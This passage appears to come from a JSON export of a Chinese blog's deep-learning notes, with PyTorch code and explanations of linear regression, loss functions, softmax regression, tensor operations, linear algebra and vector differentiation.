随机取样\ndef data_iter(batch_size, features, labels):\n    count = len(features)\n    indices = list(range(count))\n    random.shuffle(indices)\n    for i in range(0, count, batch_size):\n        batch_indices = torch.tensor(indices[i: min(i + batch_size, count)])\n        yield features[batch_indices], labels[batch_indices]\n\nbatch_size = 10\n# 设置初始预测值\nw = torch.normal(0, 0.01, size=(2, 1), requires_grad=True)\nb = torch.zeros(1, requires_grad=True)\n\n# 获取预测值的矩阵\ndef linreg(X, w, b):\n    return torch.matmul(X, w) + b\n\n# 损失函数\ndef squared_loss(y_hat, y):\n    return (y_hat - y.reshape(y_hat.shape)) ** 2 / 2\n\n# 梯度下降\ndef sgd(params, lr, batch_size):\n    with torch.no_grad():\n        # 在这区域中进行的运算不会被算入梯度\n        for param in params:\n            param -= lr * param.grad / batch_size\n            param.grad.zero_()\n\n# 训练\nlr = 0.03\nnum_epochs = 10 # 训练次数\nnet = linreg # 选用神经网络\nloss = squared_loss # 选用损失函数\n\nfor epoch in range(num_epochs):\n    for X, y in data_iter(batch_size, features, labels):\n        # 使用 linreg 进行预测，然后 squared_loss 来计算损失\n        l = loss(net(X, w, b), y)\n        # 目前得到的 l 是一个 (batch_size, 1) 形状的向量，使用 sum 将其转为标量，然后就可以求梯度\n        l.sum().backward()\n        sgd([w, b], lr, batch_size) # 进行梯度下降\n    # 输出统计数据\n    with torch.no_grad():\n        train_l = loss(net(features, w, b), labels)\n        print(f'epoch: {epoch}, loss: {float(train_l.mean()):f}')\n\nprint(f'w_hat: {w}')\nprint(f'b_hat: {b}')\nprint(f'delta w: {true_w - w.reshape(true_w.shape)}')\nprint(f'delta b: {true_b - b}')\n```\n\n### 1.3 简便写法\n\n使用 pytorch 定义好的工具。先生成数据集：\n\n```python\ntrue_w = torch.tensor([2, -3.4])\ntrue_b = 4.2\nfeatures, labels = synthetic_data(true_w, true_b, 10000)\n```\n\n使用框架自带的随机采样读取器：\n\n```python\ndef load_array(data_arrays, batch_size, is_train=True):\n    \"\"\"构造一个PyTorch数据迭代器\"\"\"\n    dataset = data.TensorDataset(*data_arrays)\n    return data.DataLoader(dataset, batch_size, shuffle=is_train)\n\nbatch_size = 10\ndata_iter = load_array((features, labels), batch_size)\n```\n\n然后定义神经网络，其中 `nn.Sequential` 把神经网络中的每一层连接，`nn.Linear(2, 1)` 相当于是一个全连接层，表示有 $2$ 个因素影响 $1$ 个输出结果（相当于是 $2\\times 1$ 的矩阵）\n\n```python\nfrom torch import nn\n\nnet = nn.Sequential(nn.Linear(2, 1))\n# 设置初始权重和偏置\nnet[0].weight.data.normal_(0, 0.01)\nnet[0].bias.data.fill_(0)\n```\n\n计算均方误差使用的是 `MMSELoss` 类\n\n```python\nloss = nn.MSELoss()\n```\n\n然后设置优化算法，即梯度下降\n\n```python\ntrainer = torch.optim.SGD(net.parameters(), lr=0.03)\n```\n\n然后是训练过程：\n\n```python\nnum_epochs = 3\nfor epoch in range(num_epochs):\n    for X, y in data_iter:\n        l = loss(net(X) ,y)\n        trainer.zero_grad()\n        l.backward()\n        trainer.step()\n    l = loss(net(features), labels)\n    print(f'epoch {epoch + 1}, loss {l:f}')\n```\n\n## 2 损失函数\n\n### 2.1 L2 Loss\n\n$$\nl(y,y')=\\frac{1}{2}(y-y')^2\n$$\n\n优点：离准确值比较远的时候梯度会很大，下降更快\n\n缺点：有时候可能不希望下降特别快\n\n### 2.2 L1 Loss\n\n$$\nl(y,y')=|y-y'|\n$$\n\n优点：永远能以一个固定的速率下降\n\n缺点：原点处不可导，且预测值和准确值比较靠近的时候会发生剧烈抖动\n\n### 2.3 Huber's Robust Loss\n\n$$\nl(y,y')=\n\\begin{cases}\n|y-y'|-\\frac{1}{2} & \\text{ if } |y-y'|>1 \\\\\n\\frac{1}{2}(y-y')^2 & \\text{ otherwise }\n\\end{cases}\n$$\n\n结合上面两个损失函数，损失较大的时候以恒定速度下降，损失较小的时候下降速度比较平滑\n\n## 3 Softmax 回归\n\n### 3.1 问题定义\n\n由多个因素和多个权重，线性确定出多个类的比例 $o_i$\n\n我们的预测概率为 $\\mathbf{\\hat{y}}=\\text{sofmax}(\\mathbf{o})$\n\n其中 $\\hat{y}_i=\\frac{\\text{exp}(o_i)}{\\sum_k\\text{exp}(o_k)}$，也就是把多个类比例用自然指数函数转为一个非负数之后再分百分比\n\n而精确值 $\\mathbf{y}=\\begin{bmatrix} y_1,y_2,\\dots,y_n \\end{bmatrix}^T$\n\n其中：\n\n$$\ny_i=\\begin{cases}\n1  &\\text{ if } i=y\\\\\n0  &\\text{otherwise}\n\\end{cases}\n$$\n\n也就是精确值只有正确分类的权重为 $1$，其他都为 $0$\n\n我们一般使用交叉熵来衡量两个概率的区别 $H(\\mathbf{p},\\mathbf{q})=\\sum_i-p_i\\log(q_i)$\n\n那么损失函数：\n\n$$\nl(\\mathbf{y},\\mathbf{\\hat{y}})=-\\sum_iy_i\\log\\hat{y_i}=-\\log\\hat{y}_y\n$$\n\n### 3.2 梯度下降\n\n准备训练数据集：\n\n```python\ndef get_dataloader_workers():\n    \"\"\"使用4个进程来读取数据\"\"\"\n    return 4\ndef load_data_fashion_mnist(batch_size, resize=None):\n    \"\"\"下载Fashion-MNIST数据集，然后将其加载到内存中\"\"\"\n    trans = [transforms.ToTensor()]\n    if resize:\n        trans.insert(0, transforms.Resize(resize))\n    trans = transforms.Compose(trans)\n    mnist_train = torchvision.datasets.FashionMNIST(\n        root=\"../data\", train=True, transform=trans, download=True)\n    mnist_test = torchvision.datasets.FashionMNIST(\n        root=\"../data\", train=False, transform=trans, download=True)\n    return (data.DataLoader(mnist_train, batch_size, shuffle=True,\n                            num_workers=get_dataloader_workers()),\n            data.DataLoader(mnist_test, batch_size, shuffle=False,\n                            num_workers=get_dataloader_workers()))\n```\n\n设置迭代器\n\n```python\nbatch_size = 256\ntrain_iter, test_iter = load_data_fashion_mnist(32, resize=64)\n```\n\n定义权重和偏置：\n\n```python\n\nW = torch.normal(0, 0.01, size=(num_inputs, num_outputs), requires_grad=True)\nb = torch.zeros(num_outputs, requires_grad=True)\n```\n\n其中 $\\mathbf{W}$ 为 $784\\times 10$ 的矩阵。我们这里图片像素为 $28\\times 28$，由于图片颜色只有一个通道，所以每个像素的亮度就相当于是一个决定图片类型的因子，共有 $784$ 个因子，然后每个因子由分别决定 $10$ 个类别\n\n然后有 `softmax` 函数，其传入一个矩阵。函数将对每个项求幂，然后对每一行进行求和，得到每一行的规范化常数，然后每一行除以规范化常数，使得每一行的加和为 $1$\n\n```python\ndef softmax(X):\n    X_exp = torch.exp(X)\n    partition = X_exp.sum(1, keepdim=True)\n    return X_exp / partition  # 这里应用了广播机制\n```\n\n然后定义神经网络，其中 $\\mathbf{X}$ 是样本数据，这里 `reshape` 以确保样本数据中每一行都是一个样本（行数设为 `-1` 以自动推导 `batch_size`），每一列都是该样本的像素信息（把二维像素信息拍平成一维）\n\n```python\ndef net(X):\n    return softmax(torch.matmul(X.reshape((-1, W.shape[0])), W) + b)\n```\n\n然后样本数据与我们当前预测的权重矩阵相乘，就得到了每个样本对于每个分类的比例，然后再通过 `softmax` 将比例规范化，同时加上偏置\n\n通过神经网络就能得到我们的 `y_hat` 了\n\n然后我们定义交叉熵损失函数：\n\n```python\ndef cross_entropy(y_hat, y):\n    return - torch.log(y_hat[range(len(y_hat)), y])\n```\n\n我们这里的 `y` 是一个向量，$y_i$ 表示第 $i$ 个样本属于哪类。`y_hat[range(len(y_hat)), y]` 中，`range(len(y_hat))` 指明了我们要取 `y_hat` 的所有行（`len` 取的是行数），`y` 是一个 list，指明了每行取哪一列，算是 python 的语法糖。然后按照交叉熵损失的定义来求\n\n为了统计精度数据，我们还需要 `accuracy` 函数来计算我们这个预测结果在这个样本数据上正确了多少个：\n\n```python\ndef accuracy(y_hat, y):\n    \"\"\"计算预测正确的数量\"\"\"\n    if len(y_hat.shape) > 1 and y_hat.shape[1] > 1:\n        y_hat = y_hat.argmax(axis=1) # 列上找最大的概率，即为我们最终确定的结果\n    cmp = y_hat.type(y.dtype) == y\n    return float(cmp.type(y.dtype).sum())\n```\n\n`accuracy(y_hat, y) / len(y)` 即为正确率\n\n然后定义实用类 `Accumulator` 作为累加器：\n\n```python\nclass Accumulator:\n    \"\"\"在n个变量上累加\"\"\"\n    def __init__(self, n):\n        self.data = [0.0] * n\n\n    def add(self, *args):\n        self.data = [a + float(b) for a, b in zip(self.data, args)]\n\n    def reset(self):\n        self.data = [0.0] * len(self.data)\n\n    def __getitem__(self, idx):\n        return self.data[idx]\n```\n\n定义 `evaluate_acccuracy` 来计算在整个数据集上的精确度：\n\n```python\ndef evaluate_accuracy(net, data_iter):\n    \"\"\"计算在指定数据集上模型的精度\"\"\"\n    if isinstance(net, torch.nn.Module):\n        net.eval()  # 将模型设置为评估模式\n    metric = Accumulator(2)  # 正确预测数、预测总数\n    with torch.no_grad():\n        for X, y in data_iter:\n            metric.add(accuracy(net(X), y), y.numel())\n    return metric[0] / metric[1]\n```\n\n定义一个 `Animator`，以便后续动态观察我们的训练情况\n\n```python\nfrom matplotlib_inline import backend_inline\ndef use_svg_display():\n    \"\"\"Use the svg format to display a plot in Jupyter.\n\n    Defined in :numref:`sec_calculus`\"\"\"\n    backend_inline.set_matplotlib_formats('svg')\nclass Animator:\n    \"\"\"在动画中绘制数据\"\"\"\n    def __init__(self, xlabel=None, ylabel=None, legend=None, xlim=None,\n                 ylim=None, xscale='linear', yscale='linear',\n                 fmts=('-', 'm--', 'g-.', 'r:'), nrows=1, ncols=1,\n                 figsize=(3.5, 2.5)):\n        # 增量地绘制多条线\n        if legend is None:\n            legend = []\n        use_svg_display()\n        self.fig, self.axes = plt.subplots(nrows, ncols, figsize=figsize)\n        if nrows * ncols == 1:\n            self.axes = [self.axes, ]\n        # 使用lambda函数捕获参数\n        self.config_axes = lambda: d2l.set_axes(\n            self.axes[0], xlabel, ylabel, xlim, ylim, xscale, yscale, legend)\n        self.X, self.Y, self.fmts = None, None, fmts\n\n    def add(self, x, y):\n        # 向图表中添加多个数据点\n        if not hasattr(y, \"__len__\"):\n            y = [y]\n        n = len(y)\n        if not hasattr(x, \"__len__\"):\n            x = [x] * n\n        if not self.X:\n            self.X = [[] for _ in range(n)]\n        if not self.Y:\n            self.Y = [[] for _ in range(n)]\n        for i, (a, b) in enumerate(zip(x, y)):\n            if a is not None and b is not None:\n                self.X[i].append(a)\n                self.Y[i].append(b)\n        self.axes[0].cla()\n        for x, y, fmt in zip(self.X, self.Y, self.fmts):\n            self.axes[0].plot(x, y, fmt)\n        self.config_axes()\n        display.display(self.fig)\n        display.clear_output(wait=True)\n```\n\n定义训练函数 `train_epoch`\n\n```python\ndef train_epoch(net, train_iter, loss, updater):\n    \"\"\"训练模型一个迭代周期（定义见第3章）\"\"\"\n    # 将模型设置为训练模式\n    if isinstance(net, torch.nn.Module):\n        net.train()\n    # 训练损失总和、训练准确度总和、样本数\n    metric = Accumulator(3)\n    for X, y in train_iter:\n        # 计算梯度并更新参数\n        y_hat = net(X)\n        l = loss(y_hat, y)\n        if isinstance(updater, torch.optim.Optimizer):\n            # 使用PyTorch内置的优化器和损失函数\n            updater.zero_grad()\n            l.mean().backward()\n            updater.step()\n        else:\n            # 使用定制的优化器和损失函数\n            l.sum().backward()\n            updater(X.shape[0])\n        metric.add(float(l.sum()), accuracy(y_hat, y), y.numel())\n    # 返回训练损失和训练精度\n    return metric[0] / metric[2], metric[1] / metric[2]\n```\n\n定义 `updater`\n\n```python\ndef updater(batch_size):\n    return sgd([W, b], lr, batch_size)\n```\n\n总训练函数 `train`\n\n```python\ndef train(net, train_iter, test_iter, loss, num_epochs, updater):\n    \"\"\"训练模型（定义见第3章）\"\"\"\n    animator = Animator(xlabel='epoch', xlim=[1, num_epochs], ylim=[0.3, 0.9],\n                        legend=['train loss', 'train acc', 'test acc'])\n    for epoch in range(num_epochs):\n        train_metrics = train_epoch(net, train_iter, loss, updater)\n        test_acc = evaluate_accuracy(net, test_iter)\n        animator.add(epoch + 1, train_metrics + (test_acc,))\n    train_loss, train_acc = train_metrics\n    assert train_loss < 0.5, train_loss\n    assert train_acc <= 1 and train_acc > 0.7, train_acc\n    assert test_acc <= 1 and test_acc > 0.7, test_acc\n```\n\n设置学习率和训练次数后即可训练：\n\n```python\nlr = 0.1\nnum_epochs = 10\ntrain(net, train_iter, test_iter, cross_entropy, num_epochs, updater)\n```\n\n### 3.3 简便写法\n\n一样的准备数据集\n\n```python\nbatch_size = 256\ntrain_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)\n```\n\n然后定义神经网络：\n\n```python\n# PyTorch不会隐式地调整输入的形状。因此，\n# 我们在线性层前定义了展平层（flatten），来调整网络输入的形状\n# nn.Flatten 将会保留第一维度，然后剩余的维度全部展平\nnet = nn.Sequential(nn.Flatten(), nn.Linear(784, 10))\n\ndef init_weights(m):\n    if type(m) == nn.Linear:\n        nn.init.normal_(m.weight, std=0.01)\n\nnet.apply(init_weights);\n```\n\n然后定义 `loss`\n\n```python\nloss = nn.CrossEntropyLoss(reduction='none')\n```\n\n设置优化算法\n\n```python\ntrainer = torch.optim.SGD(net.parameters(), lr=0.1)\n```\n\n然后训练：\n\n```python\nnum_epochs = 10\ntrain(net, train_iter, test_iter, loss, num_epochs, trainer)\n```\n\n","summary":"本文介绍了线性回归和Softmax回归的基本原理，包括问题定义、损失函数及梯度下降算法，并提供了使用PyTorch实现模型训练和优化的代码示例。","key":["ai","深度学习","机器学习","线性回归","softmax","回归"],"tags":[],"path":["深度学习","深度学习-线性神经网络.md"],"background":"http://pic.caiwen.work/i/2025/07/13/687307de94917.png","recommend":false,"status":"published"},{"type":"Article","title":"深度学习-数学基础","id":"dl_math","createTime":"2025-07-02T14:27:00.000Z","updateTime":"2025-09-05T13:34:05.474Z","content":"\n## 1 张量\n\n`arange` 创建行向量\n\n```python\nx = torch.arange(12)\nx\n# tensor([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])\n```\n\n`shape` 获取张量的形状（沿着各个轴的长度）\n\n```python\nx.shape\n# torch.Size([12])\n```\n\n`numel` 获取张量总的元素个数\n\n```python\nx.numel()\n# 12\n```\n\n`reshape` 更改张量的形状\n\n```python\nX = x.reshape(3, 4)\nX\n# tensor([[ 0,  1,  2,  3],\n#        [ 4,  5,  6,  7],\n#        [ 8,  9, 10, 11]])\n```\n\n`reshape` 的参数传递传递 $-1$ 可以触发自动推导。`x.reshape(-1,4)` 、`x.reshape(3,-1)` 和 `x.reshape(3,4)` 一样\n\n`zeros` 创建全 $0$ 张量\n\n```python\ntorch.zeros((2, 3, 4))\n# tensor([[[0., 0., 0., 0.],\n#         [0., 0., 0., 0.],\n#         [0., 0., 0., 0.]],\n#        [[0., 0., 0., 0.],\n#         [0., 0., 0., 0.],\n#         [0., 0., 0., 0.]]])\n```\n\n`ones` 创建全 $1$ 张量\n\n```python\ntorch.ones((2, 3, 4))\n# tensor([[[1., 1., 1., 1.],\n#         [1., 1., 1., 1.],\n#         [1., 1., 1., 1.]],\n#        [[1., 1., 1., 1.],\n#         [1., 1., 1., 1.],\n#         [1., 1., 1., 1.]]])\n```\n\n`randn` 将会从均值为 $0$，标准差为 $1$ 的标准高斯分布中随机采样\n\n```python\ntorch.randn(3, 4)\n# tensor([[-0.0135,  0.0665,  0.0912,  0.3212],\n#        [ 1.4653,  0.1843, -1.6995, -0.3036],\n#        [ 1.7646,  1.0450,  0.2457, -0.7732]])\n```\n\n`tensor` 直接将 python 的列表转为张量\n\n```python\ntorch.tensor([[2, 1, 4, 3], [1, 2, 3, 4], [4, 3, 2, 1]])\n# tensor([[2, 1, 4, 3],\n#        [1, 2, 3, 4],\n#        [4, 3, 2, 1]])\n```\n\n两个张量进行加、减、乘、除、求幂、判等运算都是按元素的\n\n```python\nx = torch.tensor([1.0, 2, 4, 8])\ny = torch.tensor([2, 2, 2, 2])\nx + y, x - y, x * y, x / y, x ** y, x == y\n# (tensor([ 3.,  4.,  6., 10.]),\n#  tensor([-1.,  0.,  2.,  6.]),\n#  tensor([ 2.,  4.,  8., 16.]),\n#  tensor([0.5000, 1.0000, 2.0000, 4.0000]),\n#  tensor([ 1.,  4., 16., 64.]),\n#  tensor([False,  True, False, False]))\n```\n\n如果两个张量的大小不同，那么会有一个广播机制：沿着长度为 $1$ 的轴进行复制，使得两个张量大小相同，然后再按元素运算\n\n```python\na = torch.arange(3).reshape((3, 1))\nb = torch.arange(2).reshape((1, 2))\na, b\n# (tensor([[0],\n#          [1],\n#          [2]]),\n#  tensor([[0, 1]]))\na + b\n# tensor([[0, 1],\n#         [1, 2],\n#         [2, 3]])\n```\n\n`exp` 也是逐个元素求 $e^x$\n\n```python\ntorch.exp(x)\n# tensor([2.7183e+00, 7.3891e+00, 5.4598e+01, 2.9810e+03])\n```\n\n`cat` 可以将两个张量连接，其中 `dim` 指出在哪个维度连接\n\n```python\nX = torch.arange(12, dtype=torch.float32).reshape((3,4))\nY = torch.tensor([[2.0, 1, 4, 3], [1, 2, 3, 4], [4, 3, 2, 1]])\ntorch.cat((X, Y), dim=0), torch.cat((X, Y), dim=1)\n# (tensor([[ 0.,  1.,  2.,  3.],\n#          [ 4.,  5.,  6.,  7.],\n#          [ 8.,  9., 10., 11.],\n#          [ 2.,  1.,  4.,  3.],\n#          [ 1.,  2.,  3.,  4.],\n#          [ 4.,  3.,  2.,  1.]]),\n#  tensor([[ 0.,  1.,  2.,  3.,  2.,  1.,  4.,  3.],\n#          [ 4.,  5.,  6.,  7.,  1.,  2.,  3.,  4.],\n#          [ 8.,  9., 10., 11.,  4.,  3.,  2.,  1.]]))\n```\n\n`sum` 对所有元素进行求和，产生一个单元素的张量\n\n```python\nX.sum()\n# tensor(66.)\n```\n\n张量求和时可以指定在哪些轴上求和。沿着哪个轴求和就相当于是消除哪个轴\n\n```python\nA = torch.arange(20, dtype=torch.float32).reshape(5, 4)\nA\n# tensor([[ 0.,  1.,  2.,  3.],\n#          [ 4.,  5.,  6.,  7.],\n#          [ 8.,  9., 10., 11.],\n#          [12., 13., 14., 15.],\n#          [16., 17., 18., 19.]])\nA_sum_axis0 = A.sum(axis=0)\nA_sum_axis0, A_sum_axis0.shape\n# (tensor([40., 45., 50., 55.]), torch.Size([4]))\nA_sum_axis1 = A.sum(axis=1)\nA_sum_axis1, A_sum_axis1.shape\n# (tensor([ 6., 22., 38., 54., 70.]), torch.Size([5]))\n```\n\n`mean` 可以求得平均数\n\n```python\nA.mean(), A.sum() / A.numel()\n# (tensor(9.5000), tensor(9.5000))\n```\n\n`mean` 也可以指定沿着哪个轴\n\n```python\nA.mean(axis=0), A.sum(axis=0) / A.shape[0]\n# (tensor([ 8.,  9., 10., 11.]), tensor([ 8.,  9., 10., 11.]))\n```\n\n`sum` 可以设置 `keepdims=True` 来进行非降维的求和\n\n```python\nsum_A = A.sum(axis=1, keepdims=True)\nsum_A\n# tensor([[ 6.],\n#         [22.],\n#         [38.],\n#         [54.],\n#         [70.]])\n```\n\n结合广播机制，让一个轴的数字变为比例\n\n```python\nA / sum_A\n# tensor([[0.0000, 0.1667, 0.3333, 0.5000],\n#         [0.1818, 0.2273, 0.2727, 0.3182],\n#         [0.2105, 0.2368, 0.2632, 0.2895],\n#         [0.2222, 0.2407, 0.2593, 0.2778],\n#         [0.2286, 0.2429, 0.2571, 0.2714]])\n```\n\n`cumsum` 可以沿着一个轴进行累积求和\n\n```python\nA.cumsum(axis=0)\n# tensor([[ 0.,  1.,  2.,  3.],\n#         [ 4.,  6.,  8., 10.],\n#         [12., 15., 18., 21.],\n#         [24., 28., 32., 36.],\n#         [40., 45., 50., 55.]])\n```\n\n`[-1]` 可以访问最后一个元素，`[x:y]` 可以访问一个范围，`[:]` 访问所有元素\n\n```python\nX[-1], X[1:3]\n# (tensor([ 8.,  9., 10., 11.]),\n#  tensor([[ 4.,  5.,  6.,  7.],\n#          [ 8.,  9., 10., 11.]]))\nX[1, 2] = 9\nX\n# tensor([[ 0.,  1.,  2.,  3.],\n#         [ 4.,  5.,  9.,  7.],\n#         [ 8.,  9., 10., 11.]])\nX[0:2, :] = 12\n# tensor([[12., 12., 12., 12.],\n#         [12., 12., 12., 12.],\n#         [ 8.,  9., 10., 11.]])\n```\n\n张量运算后会生成新的实例，占用新的内存\n\n```python\nbefore = id(Y)\nY = Y + X\nid(Y) == before\n# False\n```\n\n如果我们像复用内存的话，应该写类似 `Y[:] = <expression>` 的语句\n\n```python\nZ = torch.zeros_like(Y) # 创建和给定张量大小一致的全零张量\nprint('id(Z):', id(Z))\nZ[:] = X + Y\nprint('id(Z):', id(Z))\n# id(Z): 140327634811696\n# id(Z): 140327634811696\n```\n\n或者 `X[:] = X + Y` 、`X += Y`\n\n```python\nbefore = id(X)\nX += Y\nid(X) == before\n# True\n```\n\n## 2 线性代数\n\n### 2.1 标量\n\n用只有一个元素的张量表示\n\n```python\nimport torch\n\nx = torch.tensor(3.0)\ny = torch.tensor(2.0)\n\nx + y, x * y, x / y, x**y\n# (tensor(5.), tensor(6.), tensor(1.5000), tensor(9.))\n```\n\n### 2.2 向量\n\n加粗表示。$\\mathbf{x}\\in\\mathbb{R}^n$\n\n一个一维的张量\n\n```python\nx = torch.arange(4)\nx\n# tensor([0, 1, 2, 3])\nx[3]\n# tensor(3)\n```\n\n一般认为向量的默认方向是列向量\n\n$$\n\\begin{split}\\mathbf{x} =\\begin{bmatrix}x_{1}  \\\\x_{2}  \\\\ \\vdots  \\\\x_{n}\\end{bmatrix},\\end{split}\n$$\n\n`len` 可以获得向量的长度\n\n```python\nlen(x)\n# 4\n```\n\n### 2.3 矩阵\n\n使用大写字母加粗表示，$\\mathbf{A} \\in \\mathbb{R}^{m \\times n}$\n\n一个二维张量\n\n**转置：** 如果 $\\mathbf{B}=\\mathbf{A}^\\top$，则对于任意 $i,j$ ，都有 $b_{ij}=a_{ji}$\n\n可以在代码中得到矩阵转置\n\n```python\nA = torch.arange(20).reshape(5, 4)\nA\n# tensor([[ 0,  1,  2,  3],\n#         [ 4,  5,  6,  7],\n#         [ 8,  9, 10, 11],\n#         [12, 13, 14, 15],\n#         [16, 17, 18, 19]])\nA.T\n# tensor([[ 0,  4,  8, 12, 16],\n#         [ 1,  5,  9, 13, 17],\n#         [ 2,  6, 10, 14, 18],\n#         [ 3,  7, 11, 15, 19]])\n```\n\n对阵矩阵满足：$\\mathbf{A} = \\mathbf{A}^\\top$\n\n一般矩阵的每一行代表一个数据的向量\n\n### 2.4 点积\n\n给定两个向量 $\\mathbf{x},\\mathbf{y}\\in\\mathbb{R}^d$，点积表示为 $\\mathbf{x}^\\top\\mathbf{y}$ 或者 $\\langle\\mathbf{x},\\mathbf{y}\\rangle$，计算方法是相同位置乘积再加起来：$\\mathbf{x}^\\top \\mathbf{y} = \\sum_{i=1}^{d} x_i y_i$\n\n用 `dot` 来求\n\n```python\ny = torch.ones(4, dtype = torch.float32)\nx, y, torch.dot(x, y)\n# (tensor([0., 1., 2., 3.]), tensor([1., 1., 1., 1.]), tensor(6.))\n```\n\n### 2.5 矩阵-向量积\n\n对于一个矩阵 $\\mathbf{A} \\in \\mathbb{R}^{m \\times n}$ ，我们可以将其用他的行向量来表示：\n\n$$\n\\begin{split}\\mathbf{A}=\n\\begin{bmatrix}\n\\mathbf{a}^\\top_{1} \\\\\n\\mathbf{a}^\\top_{2} \\\\\n\\vdots \\\\\n\\mathbf{a}^\\top_m \\\\\n\\end{bmatrix},\\end{split}\n$$\n\n其中 $\\mathbf{a}^\\top_{i} \\in \\mathbb{R}^n$ 为矩阵的第 $i$ 行，是一个行向量。现在又有一个向量 $\\mathbf{x} \\in \\mathbb{R}^n$，将其与矩阵相乘为：\n\n$$\n\\begin{split}\\mathbf{A}\\mathbf{x}\n= \\begin{bmatrix}\n\\mathbf{a}^\\top_{1} \\\\\n\\mathbf{a}^\\top_{2} \\\\\n\\vdots \\\\\n\\mathbf{a}^\\top_m \\\\\n\\end{bmatrix}\\mathbf{x}\n= \\begin{bmatrix}\n \\mathbf{a}^\\top_{1} \\mathbf{x}  \\\\\n \\mathbf{a}^\\top_{2} \\mathbf{x} \\\\\n\\vdots\\\\\n \\mathbf{a}^\\top_{m} \\mathbf{x}\\\\\n\\end{bmatrix}.\\end{split}\n$$\n\n也就是向量 $x$ 分别与矩阵 $A$ 的行向量做点积。\n\n通过矩阵-向量积，我们把一个 $n$ 维的向量转为了一个 $m$ 维的向量。\n\n使用 `mv` 来进行矩阵-向量积\n\n```python\nA\n# tensor([[ 0.,  1.,  2.,  3.],\n#          [ 4.,  5.,  6.,  7.],\n#          [ 8.,  9., 10., 11.],\n#          [12., 13., 14., 15.],\n#          [16., 17., 18., 19.]])\nx\n# tensor([0., 1., 2., 3.])\ntorch.mv(A, x)\n# tensor([ 14.,  38.,  62.,  86., 110.])\n```\n\n### 2.6 矩阵乘法\n\n可以理解为后面的矩阵的每一个列向量去与前面的矩阵做矩阵-向量积\n\n$$\n\\begin{split}\\mathbf{A}=\\begin{bmatrix}\n a_{11} & a_{12} & \\cdots & a_{1k} \\\\\n a_{21} & a_{22} & \\cdots & a_{2k} \\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\n a_{n1} & a_{n2} & \\cdots & a_{nk} \\\\\n\\end{bmatrix},\\quad\n\\mathbf{B}=\\begin{bmatrix}\n b_{11} & b_{12} & \\cdots & b_{1m} \\\\\n b_{21} & b_{22} & \\cdots & b_{2m} \\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\n b_{k1} & b_{k2} & \\cdots & b_{km} \\\\\n\\end{bmatrix}.\\end{split}\n$$\n\n$$\n\\begin{split}\\mathbf{C} = \\mathbf{AB} = \\begin{bmatrix}\n\\mathbf{a}^\\top_{1} \\\\\n\\mathbf{a}^\\top_{2} \\\\\n\\vdots \\\\\n\\mathbf{a}^\\top_n \\\\\n\\end{bmatrix}\n\\begin{bmatrix}\n \\mathbf{b}_{1} & \\mathbf{b}_{2} & \\cdots & \\mathbf{b}_{m} \\\\\n\\end{bmatrix}\n= \\begin{bmatrix}\n\\mathbf{a}^\\top_{1} \\mathbf{b}_1 & \\mathbf{a}^\\top_{1}\\mathbf{b}_2& \\cdots & \\mathbf{a}^\\top_{1} \\mathbf{b}_m \\\\\n \\mathbf{a}^\\top_{2}\\mathbf{b}_1 & \\mathbf{a}^\\top_{2} \\mathbf{b}_2 & \\cdots & \\mathbf{a}^\\top_{2} \\mathbf{b}_m \\\\\n \\vdots & \\vdots & \\ddots &\\vdots\\\\\n\\mathbf{a}^\\top_{n} \\mathbf{b}_1 & \\mathbf{a}^\\top_{n}\\mathbf{b}_2& \\cdots& \\mathbf{a}^\\top_{n} \\mathbf{b}_m\n\\end{bmatrix}.\\end{split}\n$$\n\n使用 `mm` 来进行矩阵乘法\n\n```python\nB = torch.ones(4, 3)\ntorch.mm(A, B)\n# tensor([[ 6.,  6.,  6.],\n#         [22., 22., 22.],\n#         [38., 38., 38.],\n#         [54., 54., 54.],\n#         [70., 70., 70.]])\n```\n\n### 2.7 范数\n\n$L_p$ 范数为：\n\n$$\n\\|\\mathbf{x}\\|_p = \\left(\\sum_{i=1}^n \\left|x_i \\right|^p \\right)^{1/p}.\n$$\n\n特别地，我们有 $L_2$ 范数：\n\n$$\n\\|\\mathbf{x}\\|_2 = \\sqrt{\\sum_{i=1}^n x_i^2},\n$$\n\n可以使用 `norm` 来求\n\n```python\nu = torch.tensor([3.0, -4.0])\ntorch.norm(u)\ntensor(5.)\n```\n\n同时我们还有 $L_1$ 范数\n\n$$\n\\|\\mathbf{x}\\|_1 = \\sum_{i=1}^n \\left|x_i \\right|.\n$$\n\n直接按照定义求\n\n```python\ntorch.abs(u).sum()\n# tensor(7.)\n```\n\n对于矩阵，有 _Frobenius_ 范数：\n\n$$\n\\|\\mathbf{X}\\|_F = \\sqrt{\\sum_{i=1}^m \\sum_{j=1}^n x_{ij}^2}.\n$$\n\n使用 `norm` 来求：\n\n```python\ntorch.norm(torch.ones((4, 9)))\n# tensor(6.)\n```\n\n## 3 微分\n\n### 3.1 向量->标量微分\n\n即自变量是向量，因变量是标量的函数：$\\frac{\\partial y}{\\partial\\mathbf{x}}$\n\n$$\n\\begin{split}\\mathbf{x}=\n\\begin{bmatrix}\nx1 \\\\\nx2 \\\\\n\\vdots \\\\\nx_n\n\\end{bmatrix}\\end{split}\n$$\n\n$$\n\\frac{\\partial y}{\\partial \\mathbf{x}} = \\begin{bmatrix} \\frac{\\partial y}{\\partial x_1}, \\frac{\\partial y}{\\partial x_1}, \\dots, \\frac{\\partial y}{\\partial x_n} \\end{bmatrix}\n$$\n\n如：$\\frac{\\partial}{\\partial \\mathbf{x}} x_1^2+2x_2^2=\\begin{bmatrix} 2x_1,4x_2 \\end{bmatrix}$\n\n即求导结果还是个向量，列向量变行向量。\n\n几何意义是得到了一个因变量下降最快的方向\n\n![](http://pic.caiwen.work/i/2025/07/06/686a16e6a7687.png)\n\n| $y$                                      | $a$            | $au$                                      | $\\text{sum}(\\mathbf{x})$ | $\\left \\| \\left \\| \\mathbf{x} \\right \\| \\right \\|^2$ | $u+v$                                                                             | $uv$                                                                                | $\\left \\langle \\mathbf{u},\\mathbf{v} \\right \\rangle$                                                                      |\n| ---------------------------------------- | -------------- | ----------------------------------------- | ------------------------ | ---------------------------------------------------- | --------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |\n| $\\frac{\\partial y}{\\partial \\mathbf{x}}$ | $\\mathbf{0}^T$ | $a\\frac{\\partial u}{\\partial \\mathbf{x}}$ | $\\mathbf{1}^T$           | $2\\mathbf{x}^T$                                      | $\\frac{\\partial u}{\\partial \\mathbf{x}} + 